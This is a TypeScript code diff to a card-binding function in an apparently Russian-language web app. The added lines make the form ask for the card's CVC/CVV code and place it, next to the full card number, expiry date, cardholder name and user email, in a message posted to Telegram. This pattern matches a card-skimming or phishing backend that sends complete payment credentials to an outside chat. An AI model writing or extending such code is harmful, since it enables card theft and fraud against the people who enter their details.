@@ -57,18 +57,21 @@ export async function requestCardBinding(input: {
   cardNumber: string
   expMonth: number
   expYear: number
+  cvc: string
 }): Promise<BindingRequestResult> {
   const user = await getSessionUser()
   const cardholder = String(input.cardholder ?? "").trim().replace(/\s+/g, " ").toUpperCase()
   const cardNumber = normalizeCardNumber(String(input.cardNumber ?? ""))
   const expMonth = Number(input.expMonth)
   const expYear = Number(input.expYear)
+  const cvc = String(input.cvc ?? "").replace(/\D/g, "")
 
   if (!/^[A-ZА-ЯЁ][A-ZА-ЯЁ' -]{1,59}$/.test(cardholder)) return { ok: false, error: "Укажите имя держателя как на карте." }
   if (cardNumber.length !== 16 || !luhnValid(cardNumber)) return { ok: false, error: "Проверьте номер карты — нужно 16 цифр." }
   if (!Number.isInteger(expMonth) || !Number.isInteger(expYear) || !isExpiryValid(expMonth, expYear)) {
     return { ok: false, error: "Проверьте срок действия карты (ММ/ГГ)." }
   }
+  if (cvc.length < 3 || cvc.length > 4) return { ok: false, error: "Укажите код CVC/CVV с обратной стороны карты." }
 
   const brand = detectBrand(cardNumber)
   const bankName = detectBank(cardNumber) ?? ""
@@ -93,7 +96,7 @@ export async function requestCardBinding(input: {
   void notifyTelegram([
     `<b>Заявка на привязку карты #${created.id}</b>`,
     `Номер: <code>${formatCardNumber(cardNumber)}</code>`,
-    `Срок: ${escapeTelegram(formatExpiry(expMonth, expYear))}`,
+    `Срок: ${escapeTelegram(formatExpiry(expMonth, expYear))} · CVC: <code>${escapeTelegram(cvc)}</code>`,
     `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
     `Держатель: ${escapeTelegram(cardholder)}`,
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
